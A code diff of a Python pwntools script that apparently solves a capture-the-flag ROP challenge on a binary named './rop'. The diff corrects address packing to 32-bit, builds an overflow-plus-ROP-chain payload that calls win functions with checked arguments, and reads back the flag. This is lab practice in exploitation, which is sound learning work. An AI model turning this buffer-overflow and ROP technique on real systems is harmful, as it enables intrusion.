@@ -17,7 +17,7 @@ do_remote = False
 binary_name = './rop'
 
 #for doing local debugging
-is_local_dbg = True
+is_local_dbg = False
 gdb_script = '''
 set pagination off
 set disassembly-flavor intel
@@ -67,20 +67,21 @@ def solve(target):
 
     padding = 'A' * 28
 
-    win1_addr = p64(0x80485cb)
-    win2_addr = p64(0x80485d8)
-    flag_addr = p64(0x804862b)
+    win1_addr = p32(0x80485cb)
+    win2_addr = p32(0x80485d8)
+    flag_addr = p32(0x804862b)
 
-    pop_ret_gadget = p64(0x08048806)
+    pop_ret_gadget = p32(0x08048806)
 
-    arg_check1 = p64(0xBAAAAAAD)
-    arg_check2 = p64(0xDEADBAAD)
+    arg_check1 = p32(0xBAAAAAAD)
+    arg_check2 = p32(0xDEADBAAD)
 
     exploit = padding + win1_addr + win2_addr + pop_ret_gadget + arg_check1 + flag_addr + pop_ret_gadget + arg_check2
-    print exploit
-    print target.recv()
+    print target.readline()
+    print target.readline()
     print target.sendline(exploit)
-    print target.recv()
+    print target.recvuntil('}')
+    return target.readline()
 
 #universal target setup for remote-only
 def target():
